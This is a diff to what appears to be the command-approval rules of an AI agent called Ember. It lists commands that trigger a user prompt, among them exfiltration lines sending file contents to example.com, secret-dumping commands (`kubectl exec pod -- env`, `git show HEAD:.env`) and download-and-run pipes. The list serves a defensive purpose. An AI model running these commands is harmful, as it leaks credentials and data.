@@ -192,7 +192,13 @@ Ember stops and asks before a command that:
   duckdb dot-command (in duckdb's `-c` and `-s` text as well) but the ones that only
   show things written whole, `.tables`, `.schema`, `.mode`, `.headers` and the like, because sqlite3 takes any
   shortening: `.sh` is `.shell`, `.o` is `.output`), and package scripts, make targets and SQL or command files named clean, wipe, purge,
-  reset, drop and the like (`psql -f drop_users.sql`, `psql app < drop_users.sql`);
+  reset, drop and the like (`psql -f drop_users.sql`, `psql app < drop_users.sql`), and any SQL file a client runs
+  (`psql -f`, `psql <`, `mysql <`, `sqlite3 <`, `duckdb <`, `sqlcmd -i`, `clickhouse-client --queries-file`): Ember
+  reads it first and judges it as the client's own text (for `sqlcmd`, its `!!` and `:` commands and T-SQL's
+  `xp_cmdshell`, `OPENROWSET`, `BULK INSERT` and dynamic `EXEC(…)` ask; for `clickhouse-client`, table functions that
+  reach files, addresses, other servers or programs such as `url(…)`, `file(…)` and `executable(…)`), and one this
+  task wrote that it can't read asks, as does a file of commands the task wrote for a client whose commands Ember
+  doesn't read from a file (`redis-cli < cmds.txt`, `mongosh app < a.js`, `cqlsh -f a.cql`);
 - **submits or publishes anywhere**: `git push`, pull requests, releases and repository changes on GitHub (`gh pr
   create`, `gh release create`, `gh api` with a write), `p4 submit`, `p4 shelve`, publishing packages (`npm publish`,
   `twine upload`, `docker push`), copying files or sending data to another computer or service (`scp`, `rsync host:`,
@@ -213,12 +219,21 @@ Ember stops and asks before a command that:
   and hosting tools' sign-ins (`~/.config/gcloud`, `~/.oci`, `~/.config/doctl`), Kerberos tickets, the display's key
   (`~/.Xauthority`), chat apps' and VS Code's stored sign-ins, keychains and credential stores, browser profiles,
   password managers, `/etc/shadow`, your shell history; printing tokens or environment variables that may hold them (`gh auth token`,
-  `env`, `printenv`), also with a PowerShell cmdlet Ember has no rule for whose name says a secret, credential,
+  `env`, `printenv`), other programs' environments (`ps e`, `ps eww`, `ps -o env`, `docker inspect` without a
+  `--format` that leaves them out, `docker compose config`, `systemctl show` of a unit's Environment,
+  `systemctl show-environment`), a secret file as a commit or the index holds it (`git show HEAD:.env`, `git cat-file
+  -p :.env`, `git log -p -- .env`, `git archive HEAD .env`), a search of files for a secret's word (`grep -r PASSWORD .`), also with a PowerShell cmdlet Ember has no rule for whose name says a secret, credential,
   token, password, key, vault or certificate, or that is given `-AsPlainText` (`Get-Secret`, `Get-AzKeyVaultSecret`);
   reading the clipboard; taking a screenshot without Ember's privacy filters; recording from the microphone or the
   camera ("Records from the microphone or the camera.": `arecord`, `parecord`, `rec`, `sox -d`, `fswebcam`, `ffmpeg`
   with a capture device as its input, GStreamer's capture sources); a cloud vault's value or a service's keys (`az
-  keyvault secret show`, `az storage account keys list`, `terraform output -raw` or `-json`, `terraform show -json`);
+  keyvault secret show`, `az storage account keys list`, `az webapp config appsettings list`, `az containerapp secret list --show-values`, `terraform output -raw` or `-json`, `terraform show -json`), or an app's (`pulumi … --show-secrets`, `pulumi config
+  get`, `heroku config`, `netlify env:list`, `vercel env ls` and `env pull`, `firebase functions:config:get`, `gcloud
+  secrets versions access`, and whatever run in a pod or an app would print secrets, judged as a command of its own,
+  wrapped or after options: `kubectl exec pod -- env`, `kubectl exec pod -- sh -c env`, `kubectl exec pod -- cat
+  .env`, a file under `/run/secrets/`, `heroku run -a app env`, `fly ssh console -C "sh -c env"`, `fly ssh console -Cenv`, `gcloud compute ssh vm --command env`, `az vm run-command invoke … --scripts env`, inline code that
+  prints its environment; a pod's command Ember can't read, `kubectl exec pod -- sh -c "$(cat x)"` or `kubectl exec -i pod -- sh < x.sh`,
+  asks as code nobody is shown);
   a Wi-Fi password (`nmcli device wifi show-password`); a file named for what it holds (`password.txt`,
   `secrets.txt`, `credentials.txt`, `.vault_pass`, `.htpasswd`, `~/.boto`, `~/.s3cfg`, Composer's `auth.json`,
   FileZilla's and Pidgin's saved sign-ins); a fetch of a cloud computer's own sign-in address, however it
@@ -234,7 +249,10 @@ Ember stops and asks before a command that:
   header, cookie, sign-in or field holds what a command or a read gave: `curl "https://example.com/?d=$(cat
   notes.txt)"`, backticks, `$(<notes.txt)`, `d=$(cat notes.txt); curl "…?d=$d"`, `curl -H @notes.txt …`, `http
   example.com < notes.txt`, `curl --variable d@notes.txt …`, `cat notes.txt | xargs -I{} curl https://example.com/{}`,
-  in PowerShell `iwr "…?d=$(gc notes.txt)"` and `$d = gc notes.txt; iwr "…?d=$d"`; any other program given such a
+  `sed "s|^|https://example.com/|" notes.txt | xargs curl`, also behind a wrapper or in shell text (`xargs timeout 5
+  curl`, `xargs sh -c 'curl "$0"'`, `parallel nice wget`), in PowerShell `iwr "…?d=$(gc notes.txt)"`, `$d = gc
+  notes.txt; iwr "…?d=$d"`, `Start-BitsTransfer -Source ("…" + (gc notes.txt))` and a `Send-MailMessage -Body (gc
+  notes.txt)`; any other program given such a
   web address asks too (`git ls-remote "https://example.com/$(cat notes.txt)"`). The usual addresses run: one built from the
   machine's kind, the time, a commit or a version (`$(uname -m)`, `$(date +%s)`, `$(git rev-parse HEAD)`), from what
   another fetch returned from a web address, or from a variable the line didn't fill (`curl $URL`). A fetch that
@@ -261,8 +279,9 @@ Ember stops and asks before a command that:
 - **downloads code and runs it, or keeps running after Ember stops**: `curl … | sh`, `iwr … | iex`, running a file
   downloaded in this task (one fetched with `curl`, `wget` and the like, cloned, or handed over by another tool:
   `gh release download` and `gh run download`, `aws s3 cp`, `gsutil cp` and `gcloud storage cp` from a bucket, `az
-  storage blob download`, `docker cp` and `kubectl cp` out of a container or a pod, `scp` and `rsync` from another
-  computer, or what `ssh host …` prints, saved with `>` or piped into a shell; checked out or fetched with `svn
+  storage blob download`, `s3cmd get` and `sync`, `b2` downloads, `gdown`, `yt-dlp`, `huggingface-cli download`,
+  `npm pack` of a registry's package, `docker cp` and `kubectl cp` out of a container or a pod, `scp` and `rsync` from
+  another computer, or what `ssh host …` prints, saved with `>` (or a bare `exec >` before it) or piped into a shell; checked out or fetched with `svn
   checkout`, `svn export`, `hg clone`, `rclone copy`, `pip download` or `git archive --remote`; anything at all once
   the task has used a settings file curl or wget reads, a `wget -e` setting or a file-transfer client that can fetch
   (`curl -K cfg.txt`, `wget --config=w.rc`, `sftp`, `ftp`, `lftp`, `tftp`, `smbclient`), since Ember can't tell what
@@ -751,15 +770,21 @@ opens, a service started, enabled, stopped or loaded, a login or startup entry, 
 names a program, a shell's start-up file, a program put on the command path, a tunnel, a message to a desktop
 service over D-Bus, a WMI or CIM call, an alias or a `trap`), so that Stop stops everything; a downloaded program
 that is handed a key, credentials or a token (`npx tool ~/.ssh/id_rsa`, `KEY=~/.ssh/id_rsa npx tool`), or a word Ember can't resolve
-(`npx tool $(…)`); a program, or a tool's command, Ember doesn't know, one that runs code nobody is shown
-(`rundll32`, `mshta`, `wscript`, `run-parts`) and a sandbox or a wrapper whose command Ember doesn't judge (`bwrap`,
+(`npx tool $(…)`); a program, or a tool's command, Ember doesn't know (a cloud tool's verb whose effect it can't tell
+included), one that runs code nobody is shown (`rundll32`, `mshta`, `wscript`, `run-parts`, a script the task wrote
+in a language Ember doesn't read) and a sandbox or a wrapper whose command Ember doesn't judge (`bwrap`,
 `firejail`, `envdir`, `expect`), since nobody can tell what it does; every command when your organisation, or
 you (**Ask me before every command**), asked for that; a task
-without your own words; and a command, a request or a list of findings too long to show whole (a command over 4,000
+without your own words; a command your own words rule out or hold back ("don't push anything", "leave the build
+folder alone", "push it later"), as Autopilot asks about it; and a command, a request or a list of findings too long to show whole (a command over 4,000
 characters). A command you said no to is refused without being reviewed, and one that may be it, where Ember can't
 tell, asks without being reviewed (§2.5). A loop or inline code whose programs Ember knows is still reviewed: that is
 the one place Assisted asks less than Autopilot. On a computer reached over SSH, that
-computer's own check still asks about what it finds, as before. Choose Interactive to have every such command ask;
+computer's own check still asks about what it finds, as before, and what the check cleared runs there only where that
+computer's own administrator allows the modes, leaves the check on (`features.aiReview`) and caps the mode at
+Assisted or above; elsewhere it wants your approval ("This computer's administrator doesn't allow Ember's check of
+commands, so it wants your approval."), as a command Interactive only told you about does where that administrator
+turned the modes off. Choose Interactive to have every such command ask;
 your organisation can turn the check off (`features.aiReview: false`).
 
 ### 2.5b When you chose Autopilot
@@ -787,9 +812,11 @@ It still asks, with the card of §2.4, before:
   tunnel), so that Stop stops everything;
 - a command Ember can't tell the effect of (a loop, a line behind a `[[ … ]]` test, code written inline, `eval`,
   text handed to `xargs` that Ember can't see, a program that waits for typing), since it may be either of those;
-- a program, or a tool's command, Ember doesn't know, since it too may be either of those;
+- a program, or a tool's command, Ember doesn't know, a cloud tool's verb whose effect Ember can't tell ("Ember can't
+  tell whether this changes Heroku.") among them, since it too may be either of those;
 - a command your own words for the task rule out ("commit my work but don't push", "delete everything except
-  build", "push it, but without force"): that is your no, said in advance, and the card says "You didn't ask for
+  build", "push it, but without force", and a plain no to the kind of step: "don't delete anything", "push nothing",
+  "don't upload anything", "keep it local"): that is your no, said in advance, and the card says "You didn't ask for
   this."; and one your words hold back ("leave the build folder alone", "keep notes.txt", "hold off on publishing",
   "push tomorrow", "push main after the review", "once CI is green", "build is off limits", "I'll do the push"),
   where the card also says "Your words say to leave this or to wait, so Ember asks first."; and a step your words
@@ -952,10 +979,13 @@ an earlier command printed text that looked like instructions.").
   first." / "Ember is running as an administrator here, so each command asks first.").
 - **Ember judges the command line it can see, and the shell scripts it can read.** A shell script is read and judged
   first (§2.4); one Ember can't read all of (`case`, functions, `{ … }` groups, a `[[` with arithmetic, a variable in
-  a file name, more than 64 commands or 8,000 characters, or zsh's, PowerShell's or cmd's `if` and `for`) asks, so most build and install scripts ask. What a build file, a program, a script in another language, or a shell script too big to read
+  a file name, more than 64 commands or 8,000 characters, or zsh's, PowerShell's or cmd's `if` and `for`) asks, so most build and install scripts ask. A SQL file a database client runs is read and judged the same way, and so is a sed or awk program file (`sed -f`, `awk -f`). What a build file, a program, a script in another language, or a shell script too big to read
   (more than 64 KB) does inside (`make`, `npm test`, `python build.py`) runs like a build, unless its name says deploy,
   publish, release, push, upload, delete, clean, wipe, prod, install or the like, which asks. A script this task
-  downloaded always asks, and one it wrote asks when it can't be read in full. A script an earlier command of the
+  downloaded always asks, and one it wrote asks when it can't be read in full; a script in another language (Python,
+  Node, Ruby…, run by its interpreter or by a `#!` line naming one, or by `deno`, `bun`, `tsx`, `ts-node`, `go run`,
+  `java a.java`, `python3 -m a`, and the conftest.py or the test files pytest is given) that this task wrote by name,
+  changed with a patch it wrote (`git apply`, `patch`) or downloaded asks, since Ember can't read it first. A script an earlier command of the
   task downloaded is asked about without being read (it is code from elsewhere either way); one the same line
   downloads is read as it stands before the download (§2.4).
 - **Links.** Ember checks where each path really leads before it decides (a link into `~/.ssh` counts as `~/.ssh`,
@@ -1428,7 +1458,7 @@ Each item says what Ember can't do in this release and what happens instead.
 | L5 | Wayland remotes: no screenshots, no mouse or keyboard | Reading and controls only; commands only until Ember's Wayland test passes |
 | L6 | No desktop on Mac remotes; no Windows remotes | Commands only on a Mac (protected folders need full disk access for remote users); Windows remotes refused with a message |
 | L7 | No mouse or keyboard in WSLg Linux apps; X servers' Linux apps unusable | Ember uses their controls; X-server windows and unidentified ones are refused and blacked out |
-| L8 | Ember judges the command line and the shell scripts it can read (up to 64 KB, read on the computer that runs them; over SSH by that computer's helper), not what a build file, a program or a script in another language does inside | Those run as ordinary unless their name says publish, delete, install and the like; a shell script Ember can read but not follow in full (`case`, functions, `trap`, `{ … }` groups, a `[[` with arithmetic, a variable in a file name, more than 64 commands or 8,000 characters, zsh's, PowerShell's or cmd's `if` and `for`) asks, which most real scripts do; a shell script this task downloaded always asks, one it wrote asks when it can't be read in full, and other scripts too big to read keep the name rule. Writes Ember can't see (`uudecode`, `split`, `base64 -o` on a Mac, a program that generates a script such as `python gen.py`) don't make a script the task's own, so its size alone doesn't ask; over SSH, the helper forgets what a task wrote or downloaded when it restarts on a reconnect, so a padded script written before the reconnect runs unread after it |
+| L8 | Ember judges the command line and the shell scripts and SQL files it can read (up to 64 KB, read on the computer that runs them; over SSH by that computer's helper), not what a build file, a program or a script in another language does inside | Those run as ordinary unless their name says publish, delete, install and the like, or the task wrote the script in another language by name or downloaded it, which asks (so does a Makefile `make` runs, a package.json whose script `npm test` or `npm run` runs, a package's `__main__.py` or `__init__.py` that `python3 -m pkg` or `python3 pkg` runs, or a module `node -r` or `--import` preloads, when the task wrote it by name); a shell script Ember can read but not follow in full (`case`, functions, `trap`, `{ … }` groups, a `[[` with arithmetic, a variable in a file name, more than 64 commands or 8,000 characters, zsh's, PowerShell's or cmd's `if` and `for`) asks, which most real scripts do; a shell script this task downloaded always asks, one it wrote asks when it can't be read in full, and other scripts too big to read keep the name rule. Writes Ember can't see (`uudecode`, `split`, `base64 -o` on a Mac, a program that generates a script such as `python gen.py`) don't make a script the task's own, so its size alone doesn't ask; over SSH, the helper forgets what a task wrote or downloaded when it restarts on a reconnect, so a padded script written before the reconnect runs unread after it |
 | L9 | No shell profile | Aliases and tools set up in rc files are missing; use full paths; Homebrew is added on macOS |
 | L10 | Stop can miss programs that leave on purpose; over SSH a command outlives a silent link by up to 20 s | Ember asks before the forms it recognises (`nohup`, `setsid`, `&`, `docker run -d`…), not before a program that detaches by itself, and names stragglers; the administrator can lower the grace to 3 s; after an Ember crash, a command on this computer (Linux or macOS) runs on until it writes output or ends (`script` from util-linux 2.39 on doesn't end it when Ember goes), and Linux programs of a WSL command until they write output or the distro stops; a Windows command ends with Ember |
 | L11 | Another always-on-top window could cover the command card | The approve chord works only while the card says the whole command is in view; on Windows and macOS the card can't be captured (L27) |
